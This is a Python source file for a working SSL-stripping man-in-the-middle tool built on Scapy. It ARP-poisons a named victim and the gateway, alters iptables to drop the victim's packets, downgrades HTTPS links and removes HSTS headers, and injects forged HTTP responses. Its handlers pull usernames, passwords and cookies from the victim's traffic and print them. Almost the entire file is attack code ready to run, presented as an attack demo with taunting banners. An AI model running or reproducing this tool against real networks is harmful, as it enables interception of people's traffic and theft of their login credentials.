from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import ARP, Ether
import os, sys, time, threading, re, argparse

# network config
IFACE = conf.iface                          # Default interface
GATEWAY = conf.route.route('0.0.0.0')[2]    # Default gateway
TARGET_SERVER = None                        # Can be set from command line

# global session for cookies
session = None


def parse_arguments():
    """Parse command line arguments and return parsed args"""
    parser = argparse.ArgumentParser(description='SSL Stripping Attack Tool')

    parser.add_argument('-i', '--interface', type=str,                help='Network interface to use')
    parser.add_argument('-v', '--victim',    type=str, required=True, help='IP address of target victim')
    parser.add_argument('-s', '--server',    type=str,                help='IP address of target server')

    return parser.parse_args()


def setup_system():
    """setup iptables and forwarding"""
    print(" Setting up system...")

    # enable forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # block RST so our OS doesn't mess with our packets
    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP")

    # block victim's packets after handshake so we can inject ours
    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")

    # allow handshake to complete
    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
    os.system(f"iptables -I FORWARD -s {VICTIM} -p tcp --dport 443 -m state --state NEW -j ACCEPT")

    print("""
$$\       $$$$$$$$\ $$$$$$$$\       $$$$$$$$\ $$\   $$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$$\  $$$$$$\  
$$ |      $$  _____|\__$$  __|      \__$$  __|$$ |  $$ |$$  _____|      $$  __$$\ $$  __$$\ $$$\    $$$ |$$  _____|$$  __$$\ 
$$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ /  \__|$$ /  $$ |$$$$\  $$$$ |$$ |      $$ /  \__|
$$ |      $$$$$\       $$ |            $$ |   $$$$$$$$ |$$$$$\          $$ |$$$$\ $$$$$$$$ |$$\$$\$$ $$ |$$$$$\    \$$$$$$\  
$$ |      $$  __|      $$ |            $$ |   $$  __$$ |$$  __|         $$ |\_$$ |$$  __$$ |$$ \$$$  $$ |$$  __|    \____$$\ 
$$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |      $$\   $$ |
$$$$$$$$\ $$$$$$$$\    $$ |            $$ |   $$ |  $$ |$$$$$$$$\       \$$$$$$  |$$ |  $$ |$$ | \_/ $$ |$$$$$$$$\ \$$$$$$  |
\________|\________|   \__|            \__|   \__|  \__|\________|       \______/ \__|  \__|\__|     \__|\________| \______/ 
                                                                                                                             
                                                                                                                             
                                                                                                                             
$$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$\   $$\                                                                              
$$  __$$\ $$  _____|$$  __$$\ \_$$  _|$$$\  $$ |                                                                             
$$ |  $$ |$$ |      $$ /  \__|  $$ |  $$$$\ $$ |                                                                             
$$$$$$$\ |$$$$$\    $$ |$$$$\   $$ |  $$ $$\$$ |                                                                             
$$  __$$\ $$  __|   $$ |\_$$ |  $$ |  $$ \$$$$ |                                                                             
$$ |  $$ |$$ |      $$ |  $$ |  $$ |  $$ |\$$$ |                                                                             
$$$$$$$  |$$$$$$$$\ \$$$$$$  |$$$$$$\ $$ | \$$ |                                                                             
\_______/ \________| \______/ \______|\__|  \__|                                                                             
                                                                                                                             
                                                                                                                             
                                                                                                                             
""")
    return True


def cleanup_system():
    """restore everything"""
    # remove rules
    os.system("iptables -F")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    # fix arp
    v_mac = get_mac(VICTIM)
    g_mac = get_mac(GATEWAY)

    if v_mac and g_mac:
        send(ARP(op=2, pdst=VICTIM, hwdst=v_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
        send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=VICTIM, hwsrc=v_mac), count=5, verbose=0)

        # restore server ARP
        if TARGET_SERVER:
            s_mac = get_mac(TARGET_SERVER)
            if s_mac:
                send(ARP(op=2, pdst=VICTIM, hwdst=v_mac, psrc=TARGET_SERVER, hwsrc=s_mac), count=5, verbose=0)
                send(ARP(op=2, pdst=TARGET_SERVER, hwdst=s_mac, psrc=VICTIM, hwsrc=v_mac), count=5, verbose=0)

        print("Network restored to original state")


def get_mac(ip):
    """get mac from ip"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0, iface=IFACE)
        if ans:
            return ans[0][1].src
    except:
        pass
    return None


def arp_spoof(target_ip, gateway_ip, interface, stop_event, server_ip=None):
    """arp poisoning loop"""
    v_mac = get_mac(target_ip)
    g_mac = get_mac(gateway_ip)

    if not v_mac or not g_mac:
        print(" Can't get MACs")
        return

    # Get server MAC if spoofing a specific server
    s_mac = None
    if server_ip:
        s_mac = get_mac(server_ip)
        if not s_mac:
            print(f" Can't get MAC for server {server_ip}")
        else:
            print(f" ARP Spoofing: (Target:){target_ip} <-> (Gateway:){gateway_ip} + (Server:){server_ip}")
    else:
        print(f" ARP Spoofing: (Target:){target_ip} <-> (Gateway:){gateway_ip}")

    while not stop_event.is_set():
        try:
            # spoof victim (make victim think we are the gateway)
            send(ARP(op=2, pdst=target_ip, hwdst=v_mac, psrc=gateway_ip), verbose=0, iface=interface)
            # spoof gateway (make gateway think we are the victim)
            send(ARP(op=2, pdst=gateway_ip, hwdst=g_mac, psrc=target_ip), verbose=0, iface=interface)

            # if spoofing a specific server on the local subnet
            if server_ip and s_mac:
                # make victim think we are the server
                send(ARP(op=2, pdst=target_ip, hwdst=v_mac, psrc=server_ip), verbose=0, iface=interface)
                # make server think we are the victim
                send(ARP(op=2, pdst=server_ip, hwdst=s_mac, psrc=target_ip), verbose=0, iface=interface)

            time.sleep(0.3)
        except:
            break


def strip_https(html_msg):
    """strip https links from html"""
    if not html_msg:
        return html_msg

    # replace https with http
    html_msg = re.sub(r'https://', 'http://', html_msg, flags=re.IGNORECASE)
    html_msg = re.sub(r'wss://', 'ws://', html_msg, flags=re.IGNORECASE)

    # remove security stuff
    html_msg = re.sub(r'<meta[^>]*Strict-Transport-Security[^>]*>', '', html_msg, flags=re.IGNORECASE)
    html_msg = re.sub(r'<meta[^>]*upgrade-insecure-requests[^>]*>', '', html_msg, flags=re.IGNORECASE)

    # fix js
    html_msg = re.sub(r"'https://", "'http://", html_msg)
    html_msg = re.sub(r'"https://', '"http://', html_msg)

    return html_msg


def https_fetch(url, headers=None, method="GET", body=None):
    """fetch content from https server"""
    import requests
    requests.packages.urllib3.disable_warnings()

    global session
    if session is None:
        session = requests.Session()

    try:
        if method == "POST":
            r = session.post(url, headers=headers, data=body, verify=False, timeout=5)
        else:
            r = session.get(url, headers=headers, verify=False, timeout=5)
        return r.status_code, r.headers, r.text
    except Exception as e:
        print(f" HTTPS fetch error: {e}")
        return None, None, None


def http_send(pkt, content, interface):
    """inject fake http response"""
    # strip links
    body = strip_https(content)

    # build response
    resp = "HTTP/1.1 200 OK\r\n"
    resp += "Server: Apache\r\n"
    resp += "Content-Type: text/html\r\n"
    resp += "Connection: close\r\n"
    resp += f"Content-Length: {len(body)}\r\n\r\n{body}"

    # tcp math
    ack = pkt[TCP].seq + len(pkt[TCP].payload)
    seq = pkt[TCP].ack

    # inject response
    reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
            TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=seq, ack=ack) / \
            Raw(load=resp)

    send(reply, verbose=0, iface=interface)

    # close connection
    fin = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
          TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="FA", seq=seq+len(resp), ack=ack)
    send(fin, verbose=0, iface=interface)

    return True


def parse_http(data):
    """parse http request"""
    lines = data.split('\r\n')
    parts = lines[0].split(' ')

    if len(parts) < 2:
        return None, None, None, None

    method = parts[0]
    path = parts[1]

    # get headers
    headers = {}
    body = ""
    body_started = False

    for line in lines[1:]:
        if body_started:
            body += line + '\r\n'
        elif line == "":
            body_started = True
        elif ": " in line:
            k, v = line.split(': ', 1)
            headers[k] = v

    return method, path, headers, body.strip()


def extract_credentials(body, method):
    """extract username and password from POST data"""
    if method != "POST" or not body:
        return None, None

    credentials = {}

    # Parse URL-encoded form data
    try:
        pairs = body.split('&')
        for pair in pairs:
            if '=' in pair:
                key, value = pair.split('=', 1)
                # URL decode
                import urllib.parse
                key = urllib.parse.unquote_plus(key)
                value = urllib.parse.unquote_plus(value)
                credentials[key.lower()] = value
    except:
        return None, None

    # Look for common credential field names
    username = None
    password = None

    # Common username fields
    for field in ['username', 'user', 'email', 'login', 'userid', 'user_name']:
        if field in credentials:
            username = credentials[field]
            break

    # Common password fields
    for field in ['password', 'pass', 'pwd', 'passwd']:
        if field in credentials:
            password = credentials[field]
            break

    return username, password


def handle_packet(pkt):
    """process intercepted packets"""
    if not pkt.haslayer(Raw):
        return

    # only victim traffic
    if pkt[IP].src != VICTIM or pkt[TCP].dport not in [80, 443]:
        return

    try:
        data = pkt[Raw].load.decode('utf-8', errors='ignore')

        # Quick check: if this packet contains form data, try to extract credentials
        # This catches cases where POST body is in a separate packet
        if 'username=' in data.lower() or 'password=' in data.lower():
            import urllib.parse
            try:
                # Try to parse as form data
                fields = {}
                for pair in data.split('&'):
                    if '=' in pair:
                        key, value = pair.split('=', 1)
                        key = urllib.parse.unquote_plus(key) #
                        value = urllib.parse.unquote_plus(value) #
                        fields[key.lower()] = value

                if 'username' in fields or 'password' in fields:
                    print("\n" + "="*60)
                    print("CREDENTIALS SUCCESSFULLY CAPTURED!!!")
                    print(f"    Source: {pkt[IP].src}")
                    print(f"    Destination: {pkt[IP].dst}:{pkt[TCP].dport}")
                    if 'username' in fields:
                        print(f"    Username: {fields['username']}")
                    if 'password' in fields:
                        print(f"    Password: {fields['password']}")
                    print("="*60 + "\n")
            except:
                pass

        # check if http request
        if "GET " not in data and "POST " not in data:
            return

        # parse it
        method, path, headers, body = parse_http(data)
        if not headers:
            return

        host = headers.get('Host')
        if not host:
            return

        # Extract and display credentials if POST request
        if method == "POST":
            print(f"[*] POST request detected to {host}{path}")
            print(f"[*] Body length: {len(body)} bytes")
            if body:
                print(f"[*] Body preview: {body[:200]}")

            username, password = extract_credentials(body, method)
            if username or password:
                print("\n" + "="*60)
                print("!!! CREDENTIALS CAPTURED !!!")
                print(f"    Host: {host}")
                print(f"    Path: {path}")
                if username:
                    print(f"    Username: {username}")
                if password:
                    print(f"    Password: {password}")
                print("="*60 + "\n")
            else:
                print(f" POST detected but no credentials found in body")

        # no compression
        if 'Accept-Encoding' in headers:
            del headers['Accept-Encoding']

        try:
            # fetch from https
            url = f"https://{host}{path}"
            print(f" {method} {url}")

            # Forward POST data or do GET request
            status, resp_headers, resp_body = https_fetch(url, headers, method=method, body=body)

            if resp_body:
                # check for cookies
                if resp_headers and 'Set-Cookie' in resp_headers:
                    print(f"[+] Grabbed cookies from {host}")

                # inject fake response
                http_send(pkt, resp_body, IFACE)
                print(f"[+] Stripped {host}")

        except Exception as e:
            print(f"[!] Error: {e}")

    except:
        pass


def main():
    global IFACE, VICTIM, TARGET_SERVER

    # Parse command line arguments
    args = parse_arguments()

    # Update global variables with command line arguments
    if args.interface:
        IFACE = args.interface

    VICTIM = args.victim  # Required argument

    if args.server:
        TARGET_SERVER = args.server

    print("=" * 50)
    print(" SSL Stripping Attack Demo")
    print("=" * 50)
    print(f"Interface: {IFACE}")
    print(f"Victim: {VICTIM}")
    print(f"Gateway: {GATEWAY}")
    if TARGET_SERVER:
        print(f"Target Server: {TARGET_SERVER}")
    print("=" * 50)

    # setup
    if not setup_system():
        sys.exit(1)

    # start arp spoofing
    stop = threading.Event() #
    t = threading.Thread(target=arp_spoof, args=(VICTIM, GATEWAY, IFACE, stop, TARGET_SERVER))
    t.daemon = True #
    t.start()

    time.sleep(3)

    print("\n[*] Sniffing traffic...")

    try:
        sniff(iface=IFACE, filter=f"tcp and src host {VICTIM}", prn=handle_packet, store=0)
    except KeyboardInterrupt:
        print("\n Stopping...")
    finally:
        stop.set()
        t.join(timeout=5)
        cleanup_system()
        print("""
            $$$$$$\       $$\   $$\  $$$$$$\  $$\    $$\ $$$$$$$$\        $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\   $$\ 
            \_$$  _|      $$ |  $$ |$$  __$$\ $$ |   $$ |$$  _____|      $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$$\  $$ |
              $$ |        $$ |  $$ |$$ /  $$ |$$ |   $$ |$$ |            $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |$$  / $$ |      $$$$\ $$ |
              $$ |        $$$$$$$$ |$$$$$$$$ |\$$\  $$  |$$$$$\          \$$$$$$\  $$$$$$$  |$$ |  $$ |$$$$$  /  $$$$$\    $$ $$\$$ |
              $$ |        $$  __$$ |$$  __$$ | \$$\$$  / $$  __|          \____$$\ $$  ____/ $$ |  $$ |$$  $$<   $$  __|   $$ \$$$$ |
              $$ |        $$ |  $$ |$$ |  $$ |  \$$$  /  $$ |            $$\   $$ |$$ |      $$ |  $$ |$$ |\$$\  $$ |      $$ |\$$$ |
            $$$$$$\       $$ |  $$ |$$ |  $$ |   \$  /   $$$$$$$$\       \$$$$$$  |$$ |       $$$$$$  |$$ | \$$\ $$$$$$$$\ $$ | \$$ |
            \______|      \__|  \__|\__|  \__|    \_/    \________|       \______/ \__|       \______/ \__|  \__|\________|\__|  \__|""")


if __name__ == "__main__":
    main()
